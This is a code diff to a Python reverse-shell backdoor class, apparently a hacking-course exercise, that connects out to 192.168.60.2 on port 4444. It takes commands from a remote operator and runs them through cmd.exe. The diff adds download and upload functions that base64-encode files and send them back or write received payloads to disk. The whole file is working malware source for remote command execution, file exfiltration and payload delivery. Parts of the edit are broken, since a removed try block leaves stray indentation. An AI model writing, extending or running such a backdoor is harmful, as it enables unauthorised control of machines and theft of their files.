@@ -1,4 +1,4 @@
-import socket, subprocess, os, json
+import socket, subprocess, os, json, base64
 
 class Backdoor:
 
@@ -17,48 +17,63 @@ class Backdoor:
         json_data = ""
         while True:
             try:
-                json_data = self.connection.recv(1024)
-                return json.loads(json_data.decode())
-            except ValueError:
-                continue
+                chunk = self.connection.recv(1024).decode()
+                if chunk:
+                    # print(f"Received chunk: {chunk}")
+                    json_data += chunk
+                    try:
+                        return json.loads(json_data)
+                    except json.JSONDecodeError as e:
+                        # print(f"Error decoding JSON: {e}")
+                        continue
+            except Exception as e:
+                # print(f"Exception while receiving data: {e}")
+                break
 
     def execute_system_cmd(self, command):
-        try:
+
             if os.name == 'nt':  # If the OS is Windows
                 # Run multiple commands in a single shell session using && for chaining
                 # The /c argument tells cmd.exe to run the command and then terminate.
                 full_cmd = f'cmd.exe /c "{command}"'
                 result = subprocess.check_output(full_cmd, stderr=subprocess.PIPE, shell=True)
             return result
-        
-        except subprocess.CalledProcessError as e:
-            # Capture both stdout and stderr output
-            error_message = f"Error: This command does not exist on windows"
-            print(error_message)  # Print error for debugging
-            return error_message
-        except Exception as e:
-            # Capture general exceptions
-            error_message = f"Unexpected error: {str(e)}"
-            print(error_message)  # Print error for debugging
-            return error_message
     
     def change_working_directory_to(self, path):
         os.chdir(path)
         return f"[+] Changing working directory to {path}"
     
+    def read_file(self, path):
+        with open(path, 'rb') as file:
+            return base64.b64encode(file.read())
+    
+    def write_file(self, path, content):
+        with open(path, 'wb') as file:
+            file.write(base64.b64decode(content))
+            return '[+] Upload successful.'
+
     def run(self):
         while True:
-            command = self.reliable_receive()  # Decode bytes to string and strip extra spaces/newlines
-            print(command)
-            command_result = ""
-            if command[0].lower() == "exit":  # Handle exit command from the attacker
-                break
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
-            else:
-                command_result = self.execute_system_cmd(command[0]) # Execute the command
+            command = self.reliable_receive()
+            command_result = ''
+            try:
+                if command[0].lower() == "exit":  # Handle exit command from the attacker
+                    self.connection.close()
+                    break
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
+                elif command[0] == "download" and len(command) > 1:
+                    command_result = self.read_file(command[1])
+                elif command[0] == "upload" and len(command) > 2:
+                    print("uploading")
+                    command_result = self.write_file(command[1], command[2])
+                    print(command_result)
+                else:
+                    command_result = self.execute_system_cmd(command[0]) # Execute the command
+            except Exception:
+                command_result = "[-] Error during command execution"
             self.reliable_send(command_result)# Send the result back to the attacker
-        self.connection.close()
+                
 
 my_backdoor = Backdoor("192.168.60.2", 4444)
 my_backdoor.run()
